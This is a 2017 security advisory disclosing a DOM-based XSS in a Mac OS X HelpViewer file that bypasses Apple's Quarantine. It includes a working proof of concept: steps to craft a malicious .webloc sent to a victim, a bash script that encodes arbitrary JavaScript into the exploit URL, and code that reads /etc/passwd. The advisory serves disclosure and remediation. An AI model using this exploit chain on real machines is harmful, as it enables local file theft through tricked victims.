@@ -1,0 +1,178 @@
+Title:                 Mac OS X Local Javascript Quarantine Bypass
+Product:               Mac OS X
+Version:               10.12, 10.11, 10.10 and probably prior
+Vendor:                apple.com <http://apple.com/>
+Type:                  DOM Based XSS
+Risk level:            3 / 5
+Credits:               filippo.cavallarin@wearesegment.com <mailto:filippo.cavallarin@wearesegment.com>
+CVE:                   N/A
+Vendor notification:   2017-07-15
+Vendor fix:            2017-09-25
+Public disclosure:     2017-09-28
+
+
+
+
+DETAILS
+
+Mac OS X contains a vulnerability that allows the bypass of the Apple Quarantine and the execution of arbitrary
+Javascript code without restrictions. 
+
+Basically, Apple's Quarantine works by setting an extended attribute to downloaded files (and also to files
+extracted from downloaded archive/image) that tells the system to open/execute those files in a restricted 
+environment. For example, a quarantined html file won't be able to load local resources.
+
+The vulnerability is in one html file, part of the Mac OS X core, that is prone to a DOM Based XSS allowing the 
+excution of arbitrary javascript commands in its (unrestricted) context.
+
+The mentioned file is located at /System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html
+and contains the following code:
+
+<script type="text/javascript" charset="utf-8">
+
+setBasePathFromString(urlParam("rhtml"));
+loadLocStrings();
+loadJavascriptLibs();
+
+function init () { /* <-- called by <body onload="init()" */
+ [...]
+
+ rHTMLPath = urlParam("rhtml"); /* <-- takes 'rhtml' parameters from current url */
+
+ [...]
+
+ self.contentHttpReq.open('GET', rHTMLPath, true);
+ self.contentHttpReq.onreadystatechange = function() {
+     if (self.contentHttpReq.readyState == 4) {
+         loadTutorial(self.contentHttpReq.responseText);
+     }
+ }
+ [...]
+}
+
+function loadTutorial(response) {
+ var rHTMLPath = urlParam("rhtml");
+
+ // this will create a tutorialData item
+ eval(response);
+ [...]
+}
+
+function loadLocStrings()
+{
+ var headID = document.getElementsByTagName("head")[0];         
+ var rHTMLPath = urlParam("rhtml");
+
+ rHTMLPath = rHTMLPath.replace("metaData.html", "localizedStrings.js");
+ var newScript = document.createElement('script');
+ newScript.type = 'text/javascript';
+ newScript.src = rHTMLPath;
+ headID.appendChild(newScript);      
+}
+[...]
+</script>
+
+
+In short, it takes an url from the "rhtml" query string parameter, makes a request to that url and evaluates
+the response content as javascript code.
+
+The code below contains two different DOM Based XSS. 
+The first is in the loadLocStrings() function that creates a SCRIPT element and uses the "rhtml" parameter as
+its "src" property.
+The second is in the init() function that uses the "rhtml" parameter to make an ajax call and then passes the
+response directly to eval().
+As the result the same payload is executed twice.
+
+An attacker, by providing a data uri, can take control of the response and thus what gets evaluated.
+
+One possile vector of exploitation are the .webloc files. Basically those files contain an url and they simply loads
+it in Safari when opened. 
+By crafting a .webloc file and by tricking a victim to open it, an attacker can run privileged javascript commands on
+the victim's computer.
+Due to the fact that .webloc files also use an extended attribute to store data, they must be sent contained in a tar
+archive (or any other format that supports extended attributes).
+
+
+
+PROOF OF CONCEPT
+
+To reproduce the issue follow the steps below:
+  1. create a javascript file you want to execute on your target
+  2. convert its content to base64
+  3. encode it to a "uri component" (ex with encodeURIComponent js function)
+  4. use it to build a data uri as follow:
+    data:text/plain;base64,<urlencoded base64>
+  5. prepend the following string to it:
+    file:///System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html?rhtml= <file:///System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html?rhtml=>
+  6. open it with Safari
+  7. save it as a bookmark
+  8. drag the bookmark to the Finder (a .webloc file is created, if the extension is not .webloc, rename it)
+  9. create a tar archive containing the .webloc file
+ 10. send it to the victim
+
+Note that due to the behaviour of rhtmlPlayer.html, in order to access local resources, the first line of the
+javascript code must be: document.getElementsByTagName("base")[0].href="";
+
+The following bash script will take a javascript file and converts it to final "file" url:
+BOF
+#!/bin/bash
+
+BASEURL="file:///System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html?rhtml= <file:///System/Library/CoreServices/HelpViewer.app/Contents/Resources/rhtmlPlayer.html?rhtml=>"
+BASEJS="(function(){document.getElementsByTagName('base')[0].href='';if('_' in window)return;window._=1;"
+DATAURI="data:text/plain;base64,"
+
+JSFILE=$1
+
+if [ "$JSFILE" = "" ]; then
+ echo "usage: $0 <jsfile>"
+ exit 1
+fi
+
+JS=$BASEJS`cat $JSFILE`"})();"
+ENCJS=`echo -n $JS | base64 | sed 's/=/%3D/g' | sed 's/+/%2F/g' | sed 's/\//%2B/g'`
+URL="$BASEURL""$DATAURI""$ENCJS"
+
+echo -ne "Paste the url below into Safari's url bar:\n\033[33m$URL\033[0m\n"
+EOF
+
+
+The following javascript code will alert the /etc/passwd file on the victim's computer:
+BOF
+xhr = new XMLHttpRequest();
+xhr.open("GET", "/etc/passwd", true);
+xhr.onreadystatechange = function(){
+if (xhr.readyState == 4) {
+ alert(xhr.responseText);
+}
+};
+xhr.send();
+EOF
+
+Note that only Safari will successfully load local resources via ajax (Chrome and Firefox won't). In this
+exploitation process it's not an issue since .webloc files are always opened with Safari.
+
+
+
+NOTE
+
+This issue has been silently fixed in Mac OS X High Sierra and (at time of writing) there is no mention of this
+bug in Apple's changelog. 
+No CVE has been assigned by Apple.
+
+
+SOLUTION
+
+Upgrade to Mac OS X High Sierra or simply remove rhtmlPlayer.html.
+Safari 11 (available for Mac OS X 10.11, 10.12 and 10.13) introduces the following security henancement:
+"CORS and cross origin access from file:// are now blocked unless Disable Local File Restrictions is selected from the Develop menu"
+hence the above exploit will not work against updated versions of OSX El Capitan and Sierra. However javascript execution outside quarantine is still possible.
+
+
+REFERENCES
+
+https://www.wearesegment.com/research/Mac-OS-X-Local-Javascript-Quarantine-Bypass.html <https://www.wearesegment.com/research/Mac-OS-X-Local-Javascript-Quarantine-Bypass.html>
+
+
+DISCLOSURE
+
+This vulnerability has been disclosed thru Securiteam Secure Disclosure program: http://www.beyondsecurity.com/ssd <http://www.beyondsecurity.com/ssd>
